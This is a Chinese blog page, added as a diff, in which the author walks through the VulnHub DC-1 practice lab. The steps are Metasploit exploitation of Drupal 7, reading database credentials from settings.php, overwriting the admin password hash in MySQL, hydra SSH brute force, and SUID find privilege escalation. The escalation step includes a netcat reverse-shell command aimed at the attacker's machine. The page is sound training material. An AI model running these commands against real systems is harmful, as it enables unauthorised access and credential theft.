@@ -1,0 +1,569 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pepper">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="vulnhub靶场学习路线-全纪录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-DC系列1">
+<meta property="og:url" content="http://example.com/2022/04/12/vulhub-DC1/index.html">
+<meta property="og:site_name" content="Pepper&#39;s home">
+<meta property="og:description" content="vulnhub靶场学习路线-全纪录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220413145938.jpg">
+<meta property="article:published_time" content="2022-04-12T03:15:53.000Z">
+<meta property="article:modified_time" content="2022-04-13T07:27:19.875Z">
+<meta property="article:author" content="pepper">
+<meta property="article:tag" content="靶场练习">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220413145938.jpg">
+  
+  
+  <title>vulnhub-DC系列1 - Pepper&#39;s home</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/agate.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Pepper’s home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                文章
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/window.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="vulnhub-DC系列1">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-12 11:15" pubdate>
+        2022年4月12日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.7k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      31 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">vulnhub-DC系列1</h1>
+            
+            <div class="markdown-body">
+              <h3 id="1-写在前面"><a href="#1-写在前面" class="headerlink" title="1.写在前面"></a>1.写在前面</h3><blockquote>
+<p>这里是vulnhub靶场练习的第二篇，也是DC系列的第一个，后续计划完成1-8整个DC系列。</p>
+<p>学习过程中不应该拘泥于实现的具体细节，先掌握整体思路和方法及技巧。</p>
+<p>后续再慢慢补充漏洞深入的研究。当然，并不是说理解漏洞原理不重要，毕竟这是一切的前提。</p>
+<p>Tips：DC1 一共有5个flag</p>
+</blockquote>
+<h3 id="2-知识点速记"><a href="#2-知识点速记" class="headerlink" title="2.知识点速记"></a>2.知识点速记</h3><ul>
+<li>msf-payload速查</li>
+<li>meterpreter的使用</li>
+<li>mysql查询</li>
+<li>数据库密码重置-思路</li>
+<li>hydra爆破</li>
+<li>suid提权-find</li>
+</ul>
+<hr>
+<h3 id="3-环境配置"><a href="#3-环境配置" class="headerlink" title="3.环境配置"></a>3.环境配置</h3><p>直接去vulnhub官网下载 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">Vulnhub-DC1</a>对应的ova文件即可，然后拖入vmware。这里为了方便宿主机与靶机通讯，将虚拟机的网络模式设置为了<strong>NAT</strong>模式</p>
+<p>Win10 宿主机、kali2020 攻击机、vulnhub靶机 </p>
+<h3 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h3><p>环境配置好后，首先确认一下IP，在kali上查看当前IP为 192.168.114.128</p>
+<p>对当前网段的主机进行扫描</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## 粗扫一遍，确认IP</span><br>nmap -sT -R 192.168.114.128/24<br><span class="hljs-comment">## 洗扫，确认详细指纹（这里用 -A 参数，可以更多的获取系统信息、组件版本信息、脚本扫描等）</span><br>nmap -A -sT4 目标ip<br></code></pre></div></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/1649734628(1).jpg" srcset="/img/loading.gif" lazyload alt="img" style="zoom:67%;" />
+
+<p>目标主机<code>192.168.114.131</code>，存在开放端口<code>22、80、111</code>。</p>
+<ul>
+<li>http：drupal 7，暴露robots.txt</li>
+<li>ssh：先记着，后面有用</li>
+</ul>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497341692359.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom:67%;" />
+
+<p>看了看网站的robots.txt，几个文件都没有什么有用的信息。</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220412175948410.png" srcset="/img/loading.gif" lazyload alt="image-20220412175948410" style="zoom:67%;" />
+
+<hr>
+<h3 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h3><h4 id="5-1-msf-payload速查漏洞"><a href="#5-1-msf-payload速查漏洞" class="headerlink" title="5.1 msf-payload速查漏洞"></a>5.1 msf-payload速查漏洞</h4><p><strong>这里引出第一个常规思路：</strong> 在爆破、字典等常规操作无果后，如果已知网站的框架或组件，可以去搜索对应框架、组件的版本是否存在漏洞，这里去搜索drupal7漏洞，可以发现有很多可以尝试的，我们可以一一测试。当然在kali下，msf已经集成了常规框架的测试payload，非常的方便进行盲测。</p>
+<blockquote>
+<p><strong>知识点1：msf-payload速查</strong></p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">msfconsole<br>msf6 &gt; search drupal<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1649741917775.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里可以看到有非常多的模块可利用，简单粗暴的方式，从头到位撸一遍。然后发现上图中的第二个是能够反弹shell的。</p>
+<blockquote>
+<p>PS：其实最常规的做法是用扫描器扫一遍，然后根据扫描器提供的准确漏洞信息，再去msf中寻找利用模块。当然如果基于poc自行测试，那更好。</p>
+</blockquote>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497430204391.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom: 80%;" />
+
+<p>反弹的shell是meterpreter的形式，这里需要提前了解下meterpreter的使用。（太久没用，忘记使用shell进本地终端了…）。顺便生成一个交互式的tty(如何生成交互式shell，可见 Vulnhub-Mr.robot 这篇文章)</p>
+<blockquote>
+<p><strong>知识点2：meterpreter使用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/78838252">meterpreter常用命令集合</a></p>
+</blockquote>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497429863368(1).png" srcset="/img/loading.gif" lazyload alt="img" style="zoom:80%;" />
+
+<p>至此，我们成功获取flag1，flag1提示我们去找网站的配置文件。</p>
+<hr>
+<h4 id="5-2-mysql重置web密码"><a href="#5-2-mysql重置web密码" class="headerlink" title="5.2 mysql重置web密码"></a>5.2 mysql重置web密码</h4><p><strong>常规思路2：</strong>一般来说，网站框架的配置文件中，可能含有后台登录密码、数据库连接信息等。获取这些有助于进一步分析利用。</p>
+<p>搜索了下drupal的后台文件路径<code>/var/www/sites/default/settings.php</code>。查看下这个文件，果然不出所料，我们得到了flag2和一个本地mysql的账号密码。</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1649743235274.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom: 80%;" />
+
+<p>这里flag2也给出了提示，<em>暴力破解和字典并不是获得权限的唯一方式！</em>，暗示了别从web侧找思路了……</p>
+<p>看了下，本地也确实开放了3306端口，开搞！</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497435223348.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom: 80%;" />
+
+<blockquote>
+<p><strong>知识点3：mysql语句</strong></p>
+</blockquote>
+<p>这里登录mysql，对下面的数据库及表进行检索，drupal的用户，是默认存放在drupaldb数据库-&gt;users表下的。</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1649744639650.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/test111.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom: 80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">$ mysql -u dbuser -p R0ck3t -D drupaldb<br>mysql&gt; show databases;<br>mysql&gt; use drupaldb;<br>mysql&gt; show tables;<br>mysql&gt; select * from users;<br>mysql&gt; select user,pass from users;<br></code></pre></div></td></tr></table></figure>
+
+<p>上面的账号及密码显示不全，这里单独检索name和pass进行展示，得到了admin的账号及密码。但这里的密码并非是明文或者md5加密的，想要破解可能很难。</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497495159921.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom:80%;" />
+
+<blockquote>
+<p><strong>知识点4：数据库密码重置-思路</strong></p>
+<p>这里的核心其实是如何打开思维，去思考重置的方式。如何利用搜索引擎去定位问题。<code>drupal7重置密码</code>,<code>drupal忘记密码怎么办?</code>，<code>drupal后台修改密码</code>，以上这些tag都可以帮助找寻重置密码的方法，不要限制自己的思维！</p>
+</blockquote>
+<p><strong>经过搜索，得到以下重置管理员密码的方法：</strong></p>
+<ol>
+<li>通过邮箱重置密码：drupal提供了邮箱重置密码功能，那通过修改邮箱地址，就可以重置密码。</li>
+<li>通过drupal预置的密码生成脚本，生成新的密码，脚本位置&#x2F;scripts&#x2F;password-hash.sh</li>
+<li>自己创建一个账号密码，把加密后的密码覆盖admin，或者本地搭建一个，看下admin默认密码。</li>
+</ol>
+<p>这里最开始想到的是方法1，但是后面发现这个虚拟机drupal没有配邮件服务，这个路是走不通的，但实战中应该是ok的。然后是方式3，方式3是最容易想到的，因为毕竟破解难的话，我就不破解密码了，直接用加密后的密码覆盖即可。最后才是方式2，因为不深入搜索和学习，很难获知还有这么个脚本的存在。</p>
+<p>这里我直接使用方式3一步到位。（Po一下百度搜索的结果）</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1649749858985.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom: 80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">mysql&gt; update users set pass=&#x27;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4&#x27; where name=&#x27;admin&#x27;<br></code></pre></div></td></tr></table></figure>
+
+<p>上面的pass其实就是password经过drupal的SHA2加密后的密文</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497498223277.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom:80%;" />
+
+<hr>
+<h3 id="6-权限提升"><a href="#6-权限提升" class="headerlink" title="6.权限提升"></a>6.权限提升</h3><p>mysql重置完密码后，登录web后台随便翻翻，在Dashbord找到了第三个flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497500735014.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>flag3给的提示，有几个关键词，<code>perms、find、passwd、-exec、shadow</code></p>
+<ul>
+<li><code>passwd和shadow</code>，想到去看看本地passwd文件，看没有什么线索。</li>
+<li><code>perms、find 和 -exec</code>，其实这里已经暗示了suid的find命令提权（和靶机Mr.robot对应上了）</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220413113837457.png" srcset="/img/loading.gif" lazyload alt="image-20220413113837457"></p>
+<p>那我们先看下&#x2F;etc&#x2F;passwd吧，发现存在flag4用户，家目录<code>/home/flag4</code>，进去得到了flag4，提示可以用同样的方式获得flag5。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220413114742608.png" srcset="/img/loading.gif" lazyload alt="image-20220413114742608"></p>
+<p>但flag5是在root目录下的，我们一个普通用户是看不了滴，所以得想想怎么提权到root。</p>
+<h4 id="6-1-hydra爆破ssh密码"><a href="#6-1-hydra爆破ssh密码" class="headerlink" title="6.1 hydra爆破ssh密码"></a>6.1 hydra爆破ssh密码</h4><p>上面发现可以直接cd 到 flag4目录下并查看flag4.txt，所以并没有想到如何提权到flag4用户。之后看了其他的writeup，发现是可以通过爆破前面的22端口ssh获取到flag4的密码的，这里也简单学习下，多个思路。</p>
+<blockquote>
+<p><strong>知识点5：</strong>hydra爆破口令</p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">hydra -u flag4 -P <span class="hljs-regexp">/home/</span>password.dic ssh:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">114.131</span> <br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497564287279.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>后续ssh过去（不过倒是方便了之后进shell，不用非得在msf下维持了）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497564834480.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<hr>
+<h4 id="6-2-SUID提权-find"><a href="#6-2-SUID提权-find" class="headerlink" title="6.2 SUID提权-find"></a>6.2 SUID提权-find</h4><p>回归正题，我们的目标是提权到root。根据前面的提示<code>perms、find、-exec</code>，可以很明显知道是要利用SUID提权了。这里如果对SUID提权不了解，可以看下之前总结的一篇博客，SUID提权（挖个坑）。</p>
+<blockquote>
+<p><strong>知识点6：</strong>SUID-find提权</p>
+<p>如果Find命令是以suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p>
+<p>而使用find查找的时候，可以通过加入-exec 参数来执行测试表达式（理解为并列执行的意思），从而以root权限执行系统命令。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497510618652.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## -p是bash的参数，指的是如果uid和euid(或者说是suid)不一致的时候，如果不加-p，则euid会强制变成uid，从而无法反弹root的shell</span><br>find test_find -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br>find test_find -<span class="hljs-built_in">exec</span> /bin/bash -p \;<br>find test_find -<span class="hljs-built_in">exec</span> nc 192.168.114.128 5566 -e /bin/bash/ -p \;<br></code></pre></div></td></tr></table></figure>
+
+<p>有关find反弹shell和-p参数，可参考这篇：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/156795223?from_voters_page=true">为什么通过 find SUID 提权反弹的 shell 不是 root 权限？</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497547303366.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里成功得到root权限，按照flag4的提示，进入&#x2F;root&#x2F;下，得到最终flag，打完收工！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497548807005.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<hr>
+<h3 id="7-写在结尾"><a href="#7-写在结尾" class="headerlink" title="7.写在结尾"></a>7.写在结尾</h3><p><strong>对DC1学习内容做个复盘：</strong></p>
+<blockquote>
+<p><strong>漏洞利用部分：</strong>主要是如何快速信息收集，从而获取网站的漏洞。在进入后台后获取系统配置文件，并根据配置文件，获得mysql账号，从而通过mysql修改web网站密码，登录web应用系统。</p>
+<p><strong>提权部分：</strong>提权部分主要还是通过端口服务密码爆破(flag4)及suid命令提权</p>
+<p><strong>其他亮点：</strong>DC1的主要亮点，感觉在于drupal的密码重置，需要掌握一定的信息挖掘和检索的思路。</p>
+</blockquote>
+<p><strong>几个不错的writeup：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1910084">ulnhub靶机渗透之DC-1提权和Drupal漏洞利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/108027062">vulnhub之DC1靶机</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_17592003/article/details/95985962">对DC-1靶机进行渗透测试</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">vulnhub靶场练习</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/29/vulhub-Mr.robot/">
+                        <span class="hidden-mobile">vulnhub-Mr.Robot</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
